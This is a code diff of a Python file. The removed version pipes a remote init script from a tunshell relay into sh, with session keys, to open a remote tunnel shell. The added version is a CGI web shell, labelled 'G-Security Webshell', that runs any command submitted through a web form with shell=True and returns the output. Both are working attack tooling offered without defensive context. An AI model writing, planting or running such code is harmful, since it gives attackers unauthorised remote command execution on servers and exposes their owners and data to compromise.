@@ -1,25 +1,38 @@
+#!/usr/bin/env python3
+
+import cgi
 import subprocess
 
-def execute_tunnel_command():
-    command = [
-        "wget",
-        "https://lets.tunshell.com/init.sh",
-        "-O", "-",
-        "2>", "/dev/null",
-        "|", "sh", "-s", "--",
-        "T", "fzDliG84j9ktSvXvykEgrg",
-        "6sReTFovMpzvaZuuI17kHm",
-        "eu.relay.tunshell.com"
-    ]
-    
-    # Join the command list into a single string
-    command_str = " ".join(command)
-    
-    try:
-        # Execute the command
-        subprocess.run(command_str, shell=True, check=True)
-    except subprocess.CalledProcessError as e:
-        print(f"Error executing command: {e}")
+print("Content-type: text/html\n")
 
-# Call the function to execute the command
-execute_tunnel_command()
+print("""
+<html>
+<head>
+<title>G-Security Webshell</title>
+</head>
+
+<body bgcolor="#000000" text="#ffffff">
+<form method="POST">
+<br>
+<input type="TEXT" name="-cmd" size="64" value="" style="background:#000000;color:#ffffff;">
+<input type="submit" value="Execute">
+<hr>
+<pre>
+""")
+
+form = cgi.FieldStorage()
+cmd = form.getvalue("-cmd", "")
+
+if cmd:
+    try:
+        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
+        print(output)
+    except subprocess.CalledProcessError as e:
+        print(f"Error executing command: {e.output}")
+
+print("""
+</pre>
+</form>
+</body>
+</html>
+""")
